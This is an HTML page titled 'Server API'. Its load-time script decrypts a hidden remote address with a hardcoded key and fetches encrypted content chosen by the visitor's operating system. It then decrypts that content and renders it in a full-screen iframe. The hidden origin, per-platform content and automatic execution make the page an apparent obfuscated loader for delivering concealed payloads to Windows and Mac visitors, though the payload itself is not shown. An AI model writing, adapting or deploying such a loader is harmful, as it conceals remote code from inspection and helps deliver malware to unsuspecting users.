<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Server API</title>

<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>

<style>
html,body{
    margin:0;
    width:100%;
    height:100%;
    overflow:hidden;
    background:#fff;
}

iframe{
    width:100%;
    height:100%;
    border:0;
    display:block;
}
</style>
</head>

<body>

<iframe
    id="frame"
    src="/server-api.html"
    allowfullscreen
    allow="fullscreen">
</iframe>

<script>

const PASSPHRASE = "98yNCjeAfWMwk0wI";

const URL_KEY = "UrLk3yShopEase01";

const ENC_DATA_ORIGIN =
"U2FsdGVkX1+eeP3rYck3awlh7p+cRXntKEBc5PvRG/WJ+Xsr5AzdM+Jr8jkEOCHS";

const DATA_ORIGIN = CryptoJS.AES.decrypt(
    ENC_DATA_ORIGIN,
    URL_KEY
).toString(CryptoJS.enc.Utf8);

const DATA_URL = DATA_ORIGIN + "/data";

let lastBlob = null;

function detectPlatform(){

    if(navigator.userAgentData){

        const p = navigator.userAgentData.platform || "";

        if(/mac/i.test(p))
            return "mac";

        return "win";
    }

    const ua =
        navigator.platform ||
        navigator.userAgent ||
        "";

    if(/mac/i.test(ua))
        return "mac";

    return "win";
}

async function loadSecret(){

    try{

        const response = await fetch(
            DATA_URL +
            "?platform=" +
            detectPlatform(),
            {
                cache:"no-store"
            }
        );

        if(!response.ok)
            throw new Error("HTTP " + response.status);

        const json = await response.json();

        const html = CryptoJS.AES.decrypt(
            json.cipher,
            PASSPHRASE
        ).toString(CryptoJS.enc.Utf8);

        if(!html)
            throw new Error("Decrypt failed");

        if(lastBlob)
            URL.revokeObjectURL(lastBlob);

        lastBlob = URL.createObjectURL(
            new Blob(
                [html],
                {
                    type:"text/html"
                }
            )
        );

        document.getElementById("frame").src = lastBlob;

    }catch(err){

        console.error(err);

        document.body.innerHTML =
            "<h2 style='font-family:sans-serif;padding:30px'>Loading failed</h2><pre style='padding:30px'>" +
            err +
            "</pre>";
    }

}

window.addEventListener("load",loadSecret);

</script>

</body>
</html>
